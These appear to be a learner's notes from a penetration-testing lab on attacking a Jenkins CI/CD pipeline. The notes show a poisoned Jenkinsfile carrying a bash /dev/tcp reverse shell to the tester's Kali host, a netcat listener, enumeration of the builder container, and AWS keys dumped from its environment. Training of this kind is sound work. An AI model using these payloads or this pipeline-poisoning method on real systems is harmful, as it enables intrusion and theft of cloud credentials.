- Pipeline in CI/CD = actions taken to distribute new version of an app
- Pipeline definition file in same repo as app source 
	- GitLab: **.gitlab-ci.yml** file
	- GitHub: **.github/workflows** folder
	- Jenkins: **Jenkinsfile**
- Specific actions (like committing to repo) cause pipeline to run

- Discover pipelines in existing repositories
- Understand how to modify a pipeline file
- Learn how to get a shell from a pipeline builder
- Discover additional information from the builder

### Enumerating Repositories

*Continuing scenario from previous section: currently logged in as an admin to the web app*

![Figure 10: Explore as Authenticated User](https://static.offsec.com/offsec-courses/PEN-200/images/attacking_cicd_1/63ebef98d52a89931954ffa8bf9cae65-aacicd1_explore_auth.png)

Locate **Jenkinsfile** in the _static_content_ repo
```
01  pipeline {
02      agent any   
03      // TODO automate the building of this later
04      stages {
05          stage('Build') {
06              steps {
07                  echo 'Building..'
08              }
09          }
10          stage('Test') {
11              steps {
12                  echo 'Testing..'
13              }
14          }
15          stage('Deploy') {
16              steps {
17                  echo 'Deploying....'
18              }
19          }
20      }
21  }
```
- Line 1: definition of pipeline
- Line 2: Agent to run pipeline on (ANY)
- Line 4: Stages declared with 3 separate steps
- Line 3: Indicates this pipeline hasn't been built yet

Pivoting to different repo. The _Image_transform_ repo.

This repo has three files including a **Jenkinsfile**

Jenkinsfile in image-transform
```hlt:17,9
01 pipeline {
02    agent any
03
04    stages {
05
06      
07      stage('Validate Cloudfront File') {
08        steps {
09          withAWS(region:'us-east-1', credentials:'aws_key') {
10              cfnValidate(file:'image-processor-template.yml')
11          }
12        }
13      }
14
15      stage('Create Stack') {
16        steps {
17          withAWS(region:'us-east-1', credentials:'aws_key') {
18              cfnUpdate(
19                  stack:'image-processor-stack', 
20                  file:'image-processor-template.yml', 
21                  params:[
22                      'OriginalImagesBucketName=original-images-lgudbhv8syu2tgbk',
23                      'ThumbnailImageBucketName=thumbnail-images--lgudbhv8syu2tgbk'
24                  ], 
25                  timeoutInMinutes:10, 
26                  pollInterval:1000)
27          }
28        }
29      }
30    }
31  }
```

- Lines 9 and 17: Jenkins will load AWS plugin.
- ENV variables _AWS_ACCESS_KEY_ID_ for the access key ID,_AWS_SECRET_ACCESS_KEY_ for the secret key, and _AWS_DEFAULT_REGION_ for the region will be set

If we can obtain these creds, we may be able to escalate further. 

Also reviewing CloudFormation template
```hlt:13,18
01  AWSTemplateFormatVersion: '2010-09-09'
02
03  Parameters:
04    OriginalImagesBucketName:
05      Type: String
06      Description: Enter the name for the Original Images Bucket
07    ThumbnailImageBucketName:
08      Type: String
09      Description: Enter the name for the Thumbnail Images Bucket
10
11  Resources:
12    # S3 buckets for storing original and thumbnail images
13    OriginalImagesBucket:
14      Type: AWS::S3::Bucket
15      Properties:
16        BucketName: !Ref OriginalImagesBucketName
17        AccessControl: Private
18    ThumbnailImagesBucket:
19      Type: AWS::S3::Bucket
20      Properties:
21        BucketName: !Ref ThumbnailImageBucketName
22        AccessControl: Private
```

This app probably processes images and creates thumbnails.

Lambda Function in Cloudformation

```hlt:7,12,13
24    ImageProcessorFunction:
25      Type: 'AWS::Lambda::Function'
26      Properties:
27        FunctionName: ImageTransform
28        Handler: index.lambda_handler
29        Runtime: python3.9
30        Role: !GetAtt ImageProcessorRole.Arn
31        MemorySize: 1024
32        Environment:
33          Variables:
34            # S3 bucket names
35            ORIGINAL_IMAGES_BUCKET: !Ref OriginalImagesBucket
36            THUMBNAIL_IMAGES_BUCKET: !Ref ThumbnailImagesBucket
37        Code:
38          ZipFile: |
39            import boto3
40            import os
41            import json
42
43            SOURCE_BUCKET = os.environ['ORIGINAL_IMAGES_BUCKET']
44            DESTINATION_BUCKET = os.environ['THUMBNAIL_IMAGES_BUCKET']
45
46
47            def lambda_handler(event, context):
48                s3 = boto3.resource('s3')
49
50                # Loop through all objects in the source bucket
51                for obj in s3.Bucket(SOURCE_BUCKET).objects.all():
52                    # Get the file key and create a new Key object
53                    key = obj.key
54                    copy_source = {'Bucket': SOURCE_BUCKET, 'Key': key}
55                    new_key = key
56                    
57                    # Copy the file from the source bucket to the destination bucket
58                    # TODO: this should process the image and shrink it to a more desirable size
59                    s3.meta.client.copy(copy_source, DESTINATION_BUCKET, new_key)
60                return {
61                    'statusCode': 200,
62                    'body': json.dumps('Success')
63                }
65    ImageProcessorScheduleRule:
66      Type: AWS::Events::Rule
67      Properties:
68        Description: "Runs the ImageProcessorFunction daily"
69        ScheduleExpression: rate(1 day)
70        State: ENABLED
71        Targets:
72          - Arn: !GetAtt ImageProcessorFunction.Arn
73            Id: ImageProcessorFunctionTarget 
```

- Line 30: Lambda function has a role assigned. 
	- If we can modify this func, we may be able to extract creds

IAM policy for Lambda function in Cloudformation
```hlt:21-23,31-37
 74    ImageProcessorRole:
 75      Type: AWS::IAM::Role
 76      Properties:
 77        AssumeRolePolicyDocument:
 78          Version: '2012-10-17'
 79          Statement:
 80          - Effect: Allow
 81            Principal:
 82              Service:
 83              - lambda.amazonaws.com
 84            Action:
 85            - sts:AssumeRole
 86        Path: "/"
 87        Policies:
 88        - PolicyName: ImageProcessorLogPolicy
 89          PolicyDocument:
 90            Version: '2012-10-17'
 91            Statement:
 92            - Effect: Allow
 93              Action:
 94              - logs:CreateLogGroup
 95              - logs:CreateLogStream
 96              - logs:PutLogEvents
 97              Resource: "*"
 98        - PolicyName: ImageProcessorS3Policy
 99          PolicyDocument:
100            Version: '2012-10-17'
101            Statement:
102            - Effect: Allow
103              Action:
104                - "s3:PutObject"
105                - "s3:GetObject"
106                - "s3:AbortMultipartUpload"
107                - "s3:ListBucket"
108                - "s3:DeleteObject"
109                - "s3:GetObjectVersion"
110                - "s3:ListMultipartUploadParts"
111              Resource:
112                - !Sub arn:aws:s3:::${OriginalImagesBucket}
113                - !Sub arn:aws:s3:::${OriginalImagesBucket}/*
114                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}
115                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}/*
```

Determining when pipeline may be executing by reviewing the webhooks in web app
![Figure 12: Reviewing Webhooks Under Settings](https://static.offsec.com/offsec-courses/PEN-200/images/attacking_cicd_1/dddd2730b361bf537e369638e561d6bc-aacicd1_webhooks.png)

Review webhook triggers 
![Figure 13: Review Webhook Triggers](https://static.offsec.com/offsec-courses/PEN-200/images/attacking_cicd_1/4b2470566d1b4ca86b1e58b21bd442ac-aacicd1_webhook_triggers.png)

These settings indicate that a git push triggers pipeline.

### Modifying the Pipeline

#### Scenario - Obtaining reverse shell

Basic Jenkinsfile
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        echo 'Building..'
      }
    }
  }
}
```

Basic Jenkinsfile - withAWS from  [AWS Steps plugin](https://plugins.jenkins.io/pipeline-aws/)
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          echo 'Building..'
        }
      }
    }
  }
}
```

Basic Jenkinsfile - script
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            echo 'Building..'
          }
        }
      }
    }
  }
}
```

Basic Jenkinsfile - curl from [Nodes and Processes](https://plugins.jenkins.io/workflow-durable-task-step/) plugin using cloud Kali IP
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            sh 'curl http://192.88.99.76/'
          }
        }
      }
    }
  }
}
```

Basic Jenkinsfile - isUnix to only execute if running on Linux 
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'curl http://192.88.99.76/unix'
            }
          }
        }
      }
    }
  }
}
```

Test this code. 

Start Apache on Kali and a nc listener to catch reverse shell.

Logging into Kali in the cloud
```
kali@kali:~$ ssh kali@192.88.99.76
```

Starting apache2 on Kali
```
kali@cloud-kali:~$ sudo systemctl start apache2
```

Triggering the plugin by modifying Jenkinsfile from UI and commiting changes
![Figure 15: Committing the Jenkinsfile](https://static.offsec.com/offsec-courses/PEN-200/images/attacking_cicd_1/fd16236f617018c2296891676c3810d9-aacicd1_commiting_jenkinsfile.png)

Checking apache logs
```
kali@cloud-kali:~$ cat /var/log/apache2/access.log
198.18.53.73 - - [27/Apr/2023:19:34:40 +0000] "GET /unix HTTP/1.1" 404 436 "-" "curl/7.74.0"
```

Now we can execute a command to send reverse shell to cloud kali. 

Reverse shell
```
bash -i >& /dev/tcp/192.88.99.76/4242 0>&1
```

Basic Jenkinsfile - Final Payload
```hlt:9
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```

Starting Netcat on Kali
```
kali@cloud-kali:~$ nc -nvlp 4242
```

Return to Jenkinsfile in UI and commit the changes again to re-execute pipeline

Capture Reverse Shell
```
kali@cloud-kali:~$ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.0.1.78] from (UNKNOWN) [198.18.53.73] 54980
bash: cannot set terminal process group (58): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@5e0ed1dc7ffe:~/agent/workspace/image-transform$ whoami
whoami
jenkins
```

### Enumerating the Builder 
We have escalated privileges, enumeration time again. 

 OS and Kernel information
```hlt:2,6,7,3
jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ uname -a
uname -a
Linux fcd3cc360d9e 4.14.309-231.529.amzn2.x86_64 #1 SMP Tue Mar 14 23:44:59 UTC 2023 x86_64 GNU/Linux

jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
- Running Debian 11 on Amazon Linux Kernel

List home directory
```hlt:10
jenkins@fcd3cc360d9e:~$ ls -a
ls -a
.
..
.bash_logout
.bashrc
.cache
.config
.profile
.ssh
agent
```

Check for private keys in .ssh directory
```
jenkins@fcd3cc360d9e:~$ ls -a .ssh
ls -a
.
..
authorized_keys

jenkins@fcd3cc360d9e:~$ cat .ssh/authorized_keys
cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP+HH9VS2Oe1djuSNJWhbYaswUC544I0QCp8sSdyTs/yQiytovhTAP/Z1eA2n0OZB2/4/oJn5wpdui8TTnkQGb6KdiLMfO1hZep7QVAY1QAwxLaKz6iEAFUuNxRrctwebVNCVokZr1yQmvlW0qKdQ5RaqU5xu35oDsYhk5vcQj+o8FAhkI5zkA4Mq6UPdLgakxEHaxJT4vWL7rYYvMW8Wz2/ngZS4LlcYmTVRiSRxFs1LdwTwC5DDlL05sqqFGED+Gs6Jy6VFhCZE0oFGZ0EoIMXkjasifVUvf7jPJ/qFKRP47AwJ6zMUUGlwf8t5HFwzK6ZmDoKUiUHg6ZdOEHxHYJRXqQ1IILpgp9g+1+NhYpIwpnvkuurCLFpKby4rRKkECueRUjSMsArKuTdPBZZ1cpC12z/czcGzTib1AjIUaNwobsU5dwVbgPLnDJ6vYVQGTNq5/PLRBeHCluzpaiHFtrP80PL9XomVhCI+lGTKxD9QxYq+mSYyESiEeu7idqw8= jenkins@jenkins
```

No private keys, but authorized key indicates Jenkins controller can ssh to this machine.

Check network config
```
jenkins@fcd3cc360d9e:~$ ifconfig
ifconfig

bash: ifconfig: command not found

jenkins@fcd3cc360d9e:~$ ip a
ip a
bash: ip: command not found
```

Limitations on what we can run indicate we may be in a container. 

In a container always check for mounts that may contain secrets in `/proc/mounts`
```hlt:docker
jenkins@fcd3cc360d9e:~$ cat /proc/mounts
cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/ZWMYT5LL7SJG7W2C2AQDU3DNZU:/var/lib/docker/overlay2/l/NWVNHZEQTXKQV7TK6L5PBW2LY6:/var/lib/docker/overlay2/l/XQAFTST24ZNNZODESKXRXG2DT3:/var/lib/docker/overlay2/l/XQEBX4RY52MDAKX5AHOFQ33C3J:/var/lib/docker/overlay2/l/RL6A3EXVAAKLS2H3DCFGHT6G4I:/var/lib/docker/overlay2/l/RK5MUYP5EXDS66AROAZDUW4VJZ:/var/lib/docker/overlay2/l/GITV6R24OXBRFWILXTIPQJWAUO:/var/lib/docker/overlay2/l/IJIDXIBWIZUYBIWUF5YWXCOG4L:/var/lib/docker/overlay2/l/6MLZE4Z6A4O4GGDABKH4SEB2ML:/var/lib/docker/overlay2/l/DWFB6EYO3HEPBCCAWYQ4256GNS:/var/lib/docker/overlay2/l/I7JY2SWCL2IPGXKRREITBKE3XF:/var/lib/docker/overlay2/l/U3ULKCXTN7B3QA7WZBNB67UESW,upperdir=/var/lib/docker/overlay2/b01b1c72bc2d688d01493d2aeda69d6a4ec1f6dbb3934b8c1ba00aed3040de4a/diff,workdir=/var/lib/docker/overlay2/b01b1c72bc2d688d01493d2aeda69d6a4ec1f6dbb3934b8c1ba00aed3040de4a/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd 0 0
cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
/dev/xvda1 /run xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /tmp xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /home/jenkins xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /run xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/resolv.conf xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/hostname xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/hosts xfs rw,noatime,attr2,inode64,noquota 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
```

- Output indicates this is a docker container.
- No other mounts

Check capability / permissions of docker container at `/proc/1/status`
```hlt:1,4-6
jenkins@fcd3cc360d9e:~$ cat /proc/1/status | grep Cap
cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

- CapPrm, CapEff, and CapBnd = capabilities

Decode the capability values with `capsh`
```hlt:1,admin
kali@kali:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```
- cap_sys_admin and cap_net_admin indicate container may be privileged

We're a non-root user so we would have to priv esc to exploit these capabilities, and then try to escape the container. 

We also executed reverse shell with AWS creds. 

Use `env` to list environment variables

```hlt:1
jenkins@fcd3cc360d9e:~$ env | grep AWS
env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=W4gtNvsaeVgx5278oy5AXqA9XbWdkRWfKNamjKXo
AWS_ACCESS_KEY_ID=AKIAUBHUBEGIMU2Y5GY7
```
- AWS Keys

Now what to do with these creds...